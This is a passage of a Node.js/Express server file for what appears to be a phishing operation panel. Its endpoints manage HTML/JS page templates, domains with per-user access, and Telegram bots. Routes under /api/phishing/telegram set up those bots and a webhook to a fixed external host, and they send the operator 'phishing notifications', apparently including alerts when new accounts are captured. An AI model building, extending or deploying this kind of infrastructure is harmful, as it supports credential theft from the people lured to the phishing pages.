      status: 'error',
      message: 'Failed to delete template'
    });
  }
});

// Get single admin template by ID
app.get('/api/admin/templates/:id', authenticateUser, async (req, res) => {
  try {
    // Check if user is admin
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const { id } = req.params;

    const result = await executeQuery(`
      SELECT t.*, u.username as created_by_name
      FROM templates t
      LEFT JOIN users u ON t.created_by = u.id
      WHERE t.id = ?
    `, [id]);

    if (result.success) {
      if (result.data.length === 0) {
        return res.status(404).json({
          status: 'error',
          message: 'Template not found'
        });
      }

      res.json({
        status: 'success',
        data: result.data[0]
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch template'
      });
    }
  } catch (error) {
    console.error('Get template by ID error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch template'
    });
  }
});

// ==============================================
// USER TEMPLATE ENDPOINTS (PUBLIC)
// ==============================================

// Template thumbnail upload endpoint
app.post('/api/upload/template-thumbnail', authenticateUser, moderateRateLimiter(), templateUpload.single('thumbnail'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({
        status: 'error',
        message: 'No file uploaded'
      });
    }

    // Return the file path
    const filePath = `uploads/template/${req.file.filename}`;

    res.json({
      status: 'success',
      message: 'Template thumbnail uploaded successfully',
      filePath: filePath,
      fileName: req.file.filename,
      fileSize: req.file.size
    });
  } catch (error) {
    console.error('Template thumbnail upload error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to upload template thumbnail',
      error: error.message
    });
  }
});

// Website thumbnail upload endpoint
app.post('/api/upload/website-thumbnail', authenticateUser, moderateRateLimiter(), websiteUpload.single('thumbnail'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({
        status: 'error',
        message: 'No file uploaded'
      });
    }

    // Return the file path
    const filePath = `uploads/website/${req.file.filename}`;
    const fullUrl = `${req.protocol}://${req.get('host')}/${filePath}`;

    console.log('📸 Website thumbnail uploaded:', {
      originalName: req.file.originalname,
      filename: req.file.filename,
      size: req.file.size,
      path: filePath,
      url: fullUrl
    });

    res.json({
      status: 'success',
      message: 'Website thumbnail uploaded successfully',
      filePath: filePath,
      url: fullUrl,
      fileName: req.file.filename,
      fileSize: req.file.size
    });
  } catch (error) {
    console.error('Website thumbnail upload error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to upload website thumbnail',
      error: error.message
    });
  }
});

// Get public approved templates for users
app.get('/api/templates/public', async (req, res) => {
  try {
    const result = await executeQuery(`
      SELECT t.*, u.username as created_by_name
      FROM templates t
      LEFT JOIN users u ON t.created_by = u.id
      WHERE t.is_active = 1 
        AND t.approval_status = 'approved'
        AND t.is_shared = 1
      ORDER BY t.created_at DESC
    `);

    if (result.success) {
      res.json({
        status: 'success',
        data: result.data
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch public templates'
      });
    }
  } catch (error) {
    console.error('Get public templates error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch public templates'
    });
  }
});

// Get user's own templates
app.get('/api/templates/my-templates', authenticateUser, async (req, res) => {
  try {
    const userId = req.user.id;

    const result = await executeQuery(`
      SELECT t.*, u.username as created_by_name
      FROM templates t
      LEFT JOIN users u ON t.created_by = u.id
      WHERE t.created_by = ?
      ORDER BY t.created_at DESC
    `, [userId]);

    if (result.success) {
      res.json({
        status: 'success',
        data: result.data
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch your templates'
      });
    }
  } catch (error) {
    console.error('Get user templates error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch your templates'
    });
  }
});

// Get single user template by ID
app.get('/api/templates/:id', authenticateUser, async (req, res) => {
  try {
    const { id } = req.params;
    const userId = req.user.id;

    const result = await executeQuery(`
      SELECT t.*, u.username as created_by_name
      FROM templates t
      LEFT JOIN users u ON t.created_by = u.id
      WHERE t.id = ? AND (
        t.created_by = ? OR 
        (t.is_shared = 1 AND t.approval_status = 'approved')
      )
    `, [id, userId]);

    if (result.success) {
      if (result.data.length === 0) {
        return res.status(404).json({
          status: 'error',
          message: 'Template not found or access denied'
        });
      }

      res.json({
        status: 'success',
        data: result.data[0]
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch template'
      });
    }
  } catch (error) {
    console.error('Get user template by ID error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch template'
    });
  }
});

// Create user template
app.post('/api/templates/create', authenticateUser, strictRateLimiter(), async (req, res) => {
  try {
    const { name, description, thumbnail, type, content_html, content_css, content_js, is_shared } = req.body;
    const createdBy = req.user.id;

    if (!name) {
      return res.status(400).json({
        status: 'error',
        message: 'Template name is required'
      });
    }

    // Set approval status based on sharing and user type
    let approvalStatus = 'approved'; // Default for private templates
    let submittedForApprovalAt = null;

    if (is_shared && req.user.role !== 'admin') {
      approvalStatus = 'pending';
      submittedForApprovalAt = new Date();
    }

    const result = await executeQuery(`
      INSERT INTO templates (
        name, description, thumbnail, type, content_html, content_css, content_js, 
        is_active, is_shared, approval_status, submitted_for_approval_at, created_by
      )
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `, [
      name, description, thumbnail, type, content_html, content_css, content_js,
      1, is_shared ? 1 : 0, approvalStatus, submittedForApprovalAt, createdBy
    ]);

    if (result.success) {
      // Log activity
      try {
        const ipAddress = req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.ip;
        const userAgent = req.headers['user-agent'] || '';
        await executeQuery(`
          INSERT INTO activities (user_id, username, type, action, description, metadata, ip_address, user_agent)
          VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        `, [
          createdBy,
          req.user.username,
          'template_created',
          'Created Template',
          `Created ${type} template "${name}"${is_shared ? ' (shared)' : ''}`,
          JSON.stringify({ template_id: result.data.insertId, type, is_shared: is_shared ? 1 : 0, approval_status: approvalStatus }),
          ipAddress,
          userAgent
        ]);
      } catch (logError) {
        console.error('Failed to log activity:', logError);
      }

      res.json({
        status: 'success',
        message: is_shared && req.user.role !== 'admin'
          ? 'Template created and submitted for approval!'
          : 'Template created successfully!',
        data: { id: result.data.insertId }
      });
    } else {
      console.error('Failed to create template - Database error:', result.error);
      res.status(500).json({
        status: 'error',
        message: 'Failed to create template'
      });
    }
  } catch (error) {
    console.error('Create user template error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to create template'
    });
  }
});

// Update user template
app.put('/api/templates/update/:id', authenticateUser, strictRateLimiter(), async (req, res) => {
  try {
    const { id } = req.params;
    const { name, description, thumbnail, type, content_html, content_css, content_js, is_shared } = req.body;
    const userId = req.user.id;

    if (!name) {
      return res.status(400).json({
        status: 'error',
        message: 'Template name is required'
      });
    }

    // Check if user owns the template
    const templateCheck = await executeQuery('SELECT * FROM templates WHERE id = ? AND created_by = ?', [id, userId]);

    if (!templateCheck.success || templateCheck.data.length === 0) {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. You can only edit your own templates.'
      });
    }

    const currentTemplate = templateCheck.data[0];

    // Handle approval status for sharing changes
    let approvalStatus = currentTemplate.approval_status;
    let submittedForApprovalAt = currentTemplate.submitted_for_approval_at;

    if (is_shared && !currentTemplate.is_shared && req.user.role !== 'admin') {
      // User wants to share a previously private template
      approvalStatus = 'pending';
      submittedForApprovalAt = new Date();
    } else if (!is_shared && currentTemplate.is_shared) {
      // User wants to make a shared template private
      approvalStatus = 'approved';
      submittedForApprovalAt = null;
    }

    const result = await executeQuery(`
      UPDATE templates 
      SET name = ?, description = ?, thumbnail = ?, type = ?, content_html = ?, content_css = ?, content_js = ?, 
          is_shared = ?, approval_status = ?, submitted_for_approval_at = ?
      WHERE id = ? AND created_by = ?
    `, [
      name, description, thumbnail, type, content_html, content_css, content_js,
      is_shared ? 1 : 0, approvalStatus, submittedForApprovalAt, id, userId
    ]);

    if (result.success) {
      let message = 'Template updated successfully!';
      if (is_shared && !currentTemplate.is_shared && req.user.role !== 'admin') {
        message = 'Template updated and submitted for approval!';
      }

      res.json({
        status: 'success',
        message: message
      });
    } else {
      console.error('Failed to update template - Database error:', result.error);
      res.status(500).json({
        status: 'error',
        message: 'Failed to update template'
      });
    }
  } catch (error) {
    console.error('Update user template error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to update template'
    });
  }
});

// Delete user template
app.delete('/api/templates/delete/:id', authenticateUser, moderateRateLimiter(), async (req, res) => {
  try {
    const { id } = req.params;
    const userId = req.user.id;

    // Check if user owns the template
    const templateCheck = await executeQuery('SELECT * FROM templates WHERE id = ? AND created_by = ?', [id, userId]);

    if (!templateCheck.success || templateCheck.data.length === 0) {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. You can only delete your own templates.'
      });
    }

    const result = await executeQuery('DELETE FROM templates WHERE id = ? AND created_by = ?', [id, userId]);

    if (result.success) {
      res.json({
        status: 'success',
        message: 'Template deleted successfully'
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to delete template'
      });
    }
  } catch (error) {
    console.error('Delete user template error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to delete template'
    });
  }
});

// ==============================================
// ADMIN TEMPLATE APPROVAL ENDPOINTS
// ==============================================

// Get pending templates for approval
app.get('/api/admin/templates/pending', authenticateUser, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const result = await executeQuery(`
      SELECT t.*, u.username as created_by_name
      FROM templates t
      LEFT JOIN users u ON t.created_by = u.id
      WHERE t.approval_status = 'pending'
        AND t.is_shared = 1
      ORDER BY t.submitted_for_approval_at ASC
    `);

    if (result.success) {
      res.json({
        status: 'success',
        data: result.data
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch pending templates'
      });
    }
  } catch (error) {
    console.error('Get pending templates error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch pending templates'
    });
  }
});

// Approve template
app.post('/api/admin/templates/approve/:id', authenticateUser, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const { id } = req.params;
    const adminId = req.user.id;

    const result = await executeQuery(`
      UPDATE templates 
      SET approval_status = 'approved', approved_by = ?, approved_at = NOW()
      WHERE id = ? AND approval_status = 'pending'
    `, [adminId, id]);

    if (result.success && result.data.affectedRows > 0) {
      res.json({
        status: 'success',
        message: 'Template approved successfully'
      });
    } else {
      res.status(404).json({
        status: 'error',
        message: 'Template not found or already processed'
      });
    }
  } catch (error) {
    console.error('Approve template error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to approve template'
    });
  }
});

// Reject template
app.post('/api/admin/templates/reject/:id', authenticateUser, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const { id } = req.params;
    const { reason } = req.body;
    const adminId = req.user.id;

    if (!reason) {
      return res.status(400).json({
        status: 'error',
        message: 'Rejection reason is required'
      });
    }

    const result = await executeQuery(`
      UPDATE templates 
      SET approval_status = 'rejected', approved_by = ?, approved_at = NOW(), rejection_reason = ?
      WHERE id = ? AND approval_status = 'pending'
    `, [adminId, reason, id]);

    if (result.success && result.data.affectedRows > 0) {
      res.json({
        status: 'success',
        message: 'Template rejected successfully'
      });
    } else {
      res.status(404).json({
        status: 'error',
        message: 'Template not found or already processed'
      });
    }
  } catch (error) {
    console.error('Reject template error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to reject template'
    });
  }
});

// Domains Management

// User accessible domains endpoint (non-admin)
app.get('/api/domains', authenticateUser, async (req, res) => {
  try {
    const userId = req.user.id;

    const result = await executeQuery(`
      SELECT DISTINCT d.id, d.domain_name, d.description, d.is_active
      FROM domains d
      WHERE d.is_active = 1 
        AND (
          d.access_type = 'public' 
          OR (
            d.access_type = 'private' 
            AND EXISTS (
              SELECT 1 FROM domain_users du 
              WHERE du.domain_id = d.id AND du.user_id = ?
            )
          )
        )
      ORDER BY d.domain_name ASC
    `, [userId]);

    if (result.success) {
      res.json({
        status: 'success',
        data: result.data
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch domains'
      });
    }
  } catch (error) {
    console.error('Get user domains error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch domains'
    });
  }
});

app.get('/api/admin/domains', authenticateUser, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const result = await executeQuery(`
      SELECT d.*, u.username as created_by_name,
             GROUP_CONCAT(
               CONCAT(du_user.username, '|', du_user.email) 
               SEPARATOR '||'
             ) as allowed_users_data
      FROM domains d
      LEFT JOIN users u ON d.created_by = u.id
      LEFT JOIN domain_users du ON d.id = du.domain_id AND d.access_type = 'private'
      LEFT JOIN users du_user ON du.user_id = du_user.id
      GROUP BY d.id
      ORDER BY d.created_at DESC
    `);

    if (result.success) {
      // Process allowed users data
      const domains = result.data.map(domain => {
        if (domain.allowed_users_data) {
          domain.allowed_users = domain.allowed_users_data.split('||').map(userData => {
            const [username, email] = userData.split('|');
            return { username, email };
          });
        } else {
          domain.allowed_users = [];
        }
        delete domain.allowed_users_data;
        return domain;
      });

      res.json({
        status: 'success',
        data: domains
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch domains'
      });
    }
  } catch (error) {
    console.error('Get domains error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch domains'
    });
  }
});

app.post('/api/admin/domains', authenticateUser, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const { domain_name, description, access_type, is_active, allowed_users = [] } = req.body;
    const createdBy = req.user.id;

    if (!domain_name) {
      return res.status(400).json({
        status: 'error',
        message: 'Domain name is required'
      });
    }

    // Validate private domain has users
    if (access_type === 'private' && (!allowed_users || allowed_users.length === 0)) {
      return res.status(400).json({
        status: 'error',
        message: 'Private domain must have at least one allowed user'
      });
    }

    // Check if domain already exists
    const existingDomain = await executeQuery(
      'SELECT id FROM domains WHERE domain_name = ?',
      [domain_name]
    );

    if (existingDomain.data.length > 0) {
      return res.status(400).json({
        status: 'error',
        message: 'Domain already exists'
      });
    }

    const result = await executeQuery(`
      INSERT INTO domains (domain_name, description, access_type, is_active, created_by)
      VALUES (?, ?, ?, ?, ?)
    `, [domain_name, description, access_type, is_active, createdBy]);

    if (result.success) {
      const domainId = result.data.insertId;

      // Add allowed users for private domains
      if (access_type === 'private' && allowed_users.length > 0) {
        for (const userId of allowed_users) {
          await executeQuery(`
            INSERT INTO domain_users (domain_id, user_id, granted_by)
            VALUES (?, ?, ?)
          `, [domainId, userId, createdBy]);
        }
      }

      res.json({
        status: 'success',
        message: 'Domain created successfully',
        data: { id: domainId }
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to create domain'
      });
    }
  } catch (error) {
    console.error('Create domain error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to create domain'
    });
  }
});

app.put('/api/admin/domains/:id', authenticateUser, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const { id } = req.params;
    const { domain_name, description, access_type, is_active, allowed_users = [] } = req.body;

    if (!domain_name) {
      return res.status(400).json({
        status: 'error',
        message: 'Domain name is required'
      });
    }

    // Validate private domain has users
    if (access_type === 'private' && (!allowed_users || allowed_users.length === 0)) {
      return res.status(400).json({
        status: 'error',
        message: 'Private domain must have at least one allowed user'
      });
    }

    // Check if domain already exists (excluding current domain)
    const existingDomain = await executeQuery(
      'SELECT id FROM domains WHERE domain_name = ? AND id != ?',
      [domain_name, id]
    );

    if (existingDomain.data.length > 0) {
      return res.status(400).json({
        status: 'error',
        message: 'Domain already exists'
      });
    }

    const result = await executeQuery(`
      UPDATE domains 
      SET domain_name = ?, description = ?, access_type = ?, is_active = ?
      WHERE id = ?
    `, [domain_name, description, access_type, is_active, id]);

    if (result.success) {
      // Update allowed users for private domains
      if (access_type === 'private') {
        // Remove existing users
        await executeQuery('DELETE FROM domain_users WHERE domain_id = ?', [id]);

        // Add new users
        if (allowed_users.length > 0) {
          for (const userId of allowed_users) {
            await executeQuery(`
              INSERT INTO domain_users (domain_id, user_id, granted_by)
              VALUES (?, ?, ?)
            `, [id, userId, req.user.id]);
          }
        }
      } else {
        // Remove all users for public domains
        await executeQuery('DELETE FROM domain_users WHERE domain_id = ?', [id]);
      }

      res.json({
        status: 'success',
        message: 'Domain updated successfully'
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to update domain'
      });
    }
  } catch (error) {
    console.error('Update domain error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to update domain'
    });
  }
});

app.delete('/api/admin/domains/:id', authenticateUser, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const { id } = req.params;

    const result = await executeQuery('DELETE FROM domains WHERE id = ?', [id]);

    if (result.success) {
      res.json({
        status: 'success',
        message: 'Domain deleted successfully'
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to delete domain'
      });
    }
  } catch (error) {
    console.error('Delete domain error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to delete domain'
    });
  }
});

// Domain Users Management
app.post('/api/admin/domains/users', authenticateUser, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const { domain_id, user_id } = req.body;
    const grantedBy = req.user.id;

    if (!domain_id || !user_id) {
      return res.status(400).json({
        status: 'error',
        message: 'Domain ID and User ID are required'
      });
    }

    // Check if user is already assigned to domain
    const existingAssignment = await executeQuery(
      'SELECT id FROM domain_users WHERE domain_id = ? AND user_id = ?',
      [domain_id, user_id]
    );

    if (existingAssignment.data.length > 0) {
      return res.status(400).json({
        status: 'error',
        message: 'User is already assigned to this domain'
      });
    }

    const result = await executeQuery(`
      INSERT INTO domain_users (domain_id, user_id, granted_by)
      VALUES (?, ?, ?)
    `, [domain_id, user_id, grantedBy]);

    if (result.success) {
      res.json({
        status: 'success',
        message: 'User added to domain successfully'
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to add user to domain'
      });
    }
  } catch (error) {
    console.error('Add user to domain error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to add user to domain'
    });
  }
});

app.delete('/api/admin/domains/:domainId/users/:userId', authenticateUser, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const { domainId, userId } = req.params;

    const result = await executeQuery(
      'DELETE FROM domain_users WHERE domain_id = ? AND user_id = ?',
      [domainId, userId]
    );

    if (result.success) {
      res.json({
        status: 'success',
        message: 'User removed from domain successfully'
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to remove user from domain'
      });
    }
  } catch (error) {
    console.error('Remove user from domain error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to remove user from domain'
    });
  }
});

// Telegram Bot Configuration
app.get('/api/phishing/telegram/config', authenticateUser, async (req, res) => {
  try {
    // const userId = req.user.id;

    // For now, return default config
    // In a real implementation, you would store this in a database
    res.json({
      status: 'success',
      data: {
        bot_token: '',
        chat_id: '',
        is_enabled: false,
        notify_new_accounts: true,
        notify_website_views: false,
        notify_errors: true
      }
    });
  } catch (error) {
    console.error('Get telegram config error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch telegram config'
    });
  }
});

app.post('/api/phishing/telegram/config', authenticateUser, async (req, res) => {
  try {
    // const userId = req.user.id;
    // const config = req.body;

    // For now, just return success
    // In a real implementation, you would store this in a database
    res.json({
      status: 'success',
      message: 'Telegram configuration saved successfully'
    });
  } catch (error) {
    console.error('Save telegram config error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to save telegram config'
    });
  }
});

app.post('/api/phishing/telegram/test', authenticateUser, async (req, res) => {
  try {
    const { bot_token, chat_id } = req.body;

    if (!bot_token || !chat_id) {
      return res.status(400).json({
        status: 'error',
        message: 'Bot token and chat ID are required'
      });
    }

    // For now, just return success
    // In a real implementation, you would send a test message via Telegram API
    res.json({
      status: 'success',
      message: 'Test message sent successfully'
    });
  } catch (error) {
    console.error('Test telegram bot error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to test telegram bot'
    });
  }
});

// ========== NEW: Telegram Bots Management APIs ==========

// Get all bots for current user
app.get('/api/phishing/telegram/bots', authenticateUser, async (req, res) => {
  try {
    const userId = req.user.id;

    const query = `
      SELECT id, bot_name, bot_token, chat_id, bot_username, 
             is_enabled, is_verified, webhook_url, webhook_set_at,
             notify_new_accounts, notify_website_views, notify_errors,
             messages_sent, last_message_at, last_error, last_error_at,
             created_at, updated_at
      FROM telegram_bots 
      WHERE user_id = ?
      ORDER BY created_at DESC
    `;

    const result = await executeQuery(query, [userId]);

    res.json({
      status: 'success',
      data: result.data || []
    });
  } catch (error) {
    console.error('Get telegram bots error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch telegram bots'
    });
  }
});

// Add new bot - MUST VERIFY FIRST
app.post('/api/phishing/telegram/bots', authenticateUser, async (req, res) => {
  try {
    const userId = req.user.id;
    const { bot_name, bot_token, chat_id, notify_new_accounts, notify_website_views, notify_errors } = req.body;

    if (!bot_name || !bot_token || !chat_id) {
      return res.status(400).json({
        status: 'error',
        message: 'Bot name, token, and chat ID are required'
      });
    }

    // STEP 1: Verify bot token and chat ID by sending test message
    console.log('🔍 Verifying bot token and chat ID...');
    console.log('Bot token:', bot_token);
    let botUsername = null;

    try {
      // Test get bot info
      const botInfoResponse = await axios.get(
        `https://api.telegram.org/bot${bot_token}/getMe`,
        { timeout: 10000 }
      );

      if (!botInfoResponse.data.ok) {
        return res.status(400).json({
          status: 'error',
          message: '❌ Invalid bot token: ' + (botInfoResponse.data.description || 'Unknown error')
        });
      }

      botUsername = botInfoResponse.data.result.username;
      console.log('✅ Bot info verified:', botUsername);
    } catch (error) {
      console.error('Bot verification error:', error.response?.data || error.message);

      let errorMessage = '❌ Invalid bot token';

      if (error.response?.status === 404) {
        errorMessage = '❌ Bot token not found. Please check:\n• Token format should be: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz\n• Get your token from @BotFather on Telegram\n• Make sure the bot is not deleted';
      } else if (error.response?.status === 401) {
        errorMessage = '❌ Unauthorized: Bot token is invalid or revoked';
      } else if (error.code === 'ECONNABORTED') {
        errorMessage = '❌ Connection timeout: Please check your internet connection';
      } else if (error.response?.data?.description) {
        errorMessage = '❌ Telegram API error: ' + error.response.data.description;
      } else {
        errorMessage = '❌ Failed to verify bot: ' + error.message;
      }

      return res.status(400).json({
        status: 'error',
        message: errorMessage
      });
    }

    // STEP 2: Test sending message to verify chat ID
    try {
      const testMessage = `🎉 <b>Bot Connected Successfully!</b>\n\n✅ Bot: <b>${bot_name}</b>\n👤 Username: @${botUsername}\n\nYou will receive phishing notifications here.`;

      const sendResponse = await axios.post(
        `https://api.telegram.org/bot${bot_token}/sendMessage`,
        {
          chat_id: chat_id,
          text: testMessage,
          parse_mode: 'HTML'
        }
      );

      if (!sendResponse.data.ok) {
        return res.status(400).json({
          status: 'error',
          message: '❌ Failed to send message: ' + (sendResponse.data.description || 'Invalid chat ID')
        });
      }

      console.log('✅ Test message sent successfully');
    } catch (error) {
      return res.status(400).json({
        status: 'error',
        message: '❌ Failed to send message: ' + (error.response?.data?.description || error.message)
      });
    }

    // STEP 3: Setup webhook
    const webhookUrl = 'https://api.scanvia.org/telegram_webhook.php';
    try {
      const webhookResponse = await axios.post(
        `https://api.telegram.org/bot${bot_token}/setWebhook`,
        {
          url: webhookUrl,
          allowed_updates: ['message', 'callback_query']
        }
      );

      if (!webhookResponse.data.ok) {
        console.log('⚠️ Webhook setup failed:', webhookResponse.data.description);
        // Continue anyway - webhook failure is not critical
      } else {
        console.log('✅ Webhook setup successful');
      }
    } catch (error) {
      console.log('⚠️ Webhook setup warning:', error.message);
      // Continue anyway
    }

    // STEP 4: Insert into database (only after successful verification)
    const query = `
      INSERT INTO telegram_bots (
        user_id, bot_name, bot_token, chat_id, bot_username,
        is_verified, is_enabled, webhook_url, webhook_set_at,
        notify_new_accounts, notify_website_views, notify_errors
      ) VALUES (?, ?, ?, ?, ?, TRUE, TRUE, ?, NOW(), ?, ?, ?)
    `;

    const result = await executeQuery(query, [
      userId, bot_name, bot_token, chat_id, botUsername,
      webhookUrl,
      notify_new_accounts ?? true,
      notify_website_views ?? false,
      notify_errors ?? true
    ]);

    if (result.success) {
      res.json({
        status: 'success',
        message: '✅ Bot verified and added successfully! Test message sent to your Telegram.',
        data: { id: result.data.insertId, bot_username: botUsername }
      });
    } else {
      throw new Error(result.error || 'Failed to insert bot');
    }
  } catch (error) {
    console.error('Add telegram bot error:', error);
    res.status(500).json({
      status: 'error',
      message: error.message.includes('Duplicate') ? '❌ Bot token already exists' : '❌ Failed to add bot: ' + error.message
    });
  }
});

// Update bot
app.put('/api/phishing/telegram/bots/:id', authenticateUser, async (req, res) => {
  try {
    const userId = req.user.id;
    const botId = req.params.id;
    const { bot_name, bot_token, chat_id, notify_new_accounts, notify_website_views, notify_errors } = req.body;

    const query = `
      UPDATE telegram_bots 
      SET bot_name = ?, bot_token = ?, chat_id = ?,
          notify_new_accounts = ?, notify_website_views = ?, notify_errors = ?
      WHERE id = ? AND user_id = ?
    `;

    const result = await executeQuery(query, [
      bot_name, bot_token, chat_id,
      notify_new_accounts, notify_website_views, notify_errors,
      botId, userId
    ]);

    if (result.success && result.data.affectedRows > 0) {
      res.json({
        status: 'success',
        message: 'Bot updated successfully'
      });
    } else {
      res.status(404).json({
        status: 'error',
        message: 'Bot not found'
      });
    }
  } catch (error) {
    console.error('Update telegram bot error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to update bot'
    });
  }
});

// Toggle bot enabled status
app.patch('/api/phishing/telegram/bots/:id/toggle', authenticateUser, async (req, res) => {
  try {
    const userId = req.user.id;
    const botId = req.params.id;
    const { is_enabled } = req.body;

    const query = `
      UPDATE telegram_bots 
      SET is_enabled = ?
      WHERE id = ? AND user_id = ?
    `;

    const result = await executeQuery(query, [is_enabled, botId, userId]);

    if (result.success && result.data.affectedRows > 0) {
      res.json({
        status: 'success',
        message: is_enabled ? 'Bot enabled' : 'Bot disabled'
      });
    } else {
      res.status(404).json({
        status: 'error',
        message: 'Bot not found'
      });
    }
  } catch (error) {
    console.error('Toggle bot error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to toggle bot'
    });
  }
});

// Verify bot and setup webhook
app.post('/api/phishing/telegram/bots/:id/verify', authenticateUser, async (req, res) => {
  try {
    const userId = req.user.id;
    const botId = req.params.id;

    // Get bot info
    const botQuery = 'SELECT bot_token, chat_id, bot_name FROM telegram_bots WHERE id = ? AND user_id = ?';
    const botResult = await executeQuery(botQuery, [botId, userId]);

    if (!botResult.success || botResult.data.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'Bot not found'
      });
    }

    const bot = botResult.data[0];

    // Step 1: Test sending message
    try {
      const testMessage = `🤖 Bot Verification\n\n✅ Bot "${bot.bot_name}" is now connected!\n\nYou will receive notifications here.`;

      const sendResponse = await axios.post(
        `https://api.telegram.org/bot${bot.bot_token}/sendMessage`,
        {
          chat_id: bot.chat_id,
          text: testMessage,
          parse_mode: 'HTML'
        }
      );

      if (!sendResponse.data.ok) {
        throw new Error(sendResponse.data.description || 'Failed to send test message');
      }
    } catch (error) {
      return res.status(400).json({
        status: 'error',
        message: `Test message failed: ${error.message}`
      });
    }

    // Step 2: Get bot info
    let botUsername = null;
    try {
      const botInfoResponse = await axios.get(
        `https://api.telegram.org/bot${bot.bot_token}/getMe`
      );

      if (botInfoResponse.data.ok) {
        botUsername = botInfoResponse.data.result.username;
      }
    } catch (error) {
      console.log('Failed to get bot info:', error.message);
    }

    // Step 3: Setup webhook
    const webhookUrl = 'https://api.scanvia.org/telegram_webhook.php';
    try {
      const webhookResponse = await axios.post(
        `https://api.telegram.org/bot${bot.bot_token}/setWebhook`,
        {
          url: webhookUrl,
          allowed_updates: ['message', 'callback_query']
        }
      );

      if (!webhookResponse.data.ok) {
        throw new Error(webhookResponse.data.description || 'Failed to set webhook');
      }
    } catch (error) {
      console.log('Webhook setup warning:', error.message);
      // Continue anyway - webhook is optional
    }

    // Step 4: Update database
    const updateQuery = `
      UPDATE telegram_bots 
      SET is_verified = TRUE, 
          bot_username = ?,
          webhook_url = ?,
          webhook_set_at = NOW()
      WHERE id = ? AND user_id = ?
    `;

    await executeQuery(updateQuery, [botUsername, webhookUrl, botId, userId]);

    res.json({
      status: 'success',
      message: '✅ Bot verified! Test message sent and webhook configured at ' + webhookUrl
    });
  } catch (error) {
    console.error('Verify bot error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Verification failed: ' + error.message
    });
  }
});

// Delete bot
app.delete('/api/phishing/telegram/bots/:id', authenticateUser, async (req, res) => {
  try {
    const userId = req.user.id;
    const botId = req.params.id;

    const query = 'DELETE FROM telegram_bots WHERE id = ? AND user_id = ?';
    const result = await executeQuery(query, [botId, userId]);

    if (result.success && result.data.affectedRows > 0) {
      res.json({
        status: 'success',
        message: 'Bot deleted successfully'
      });
    } else {
      res.status(404).json({
        status: 'error',
        message: 'Bot not found'
      });
    }
  } catch (error) {
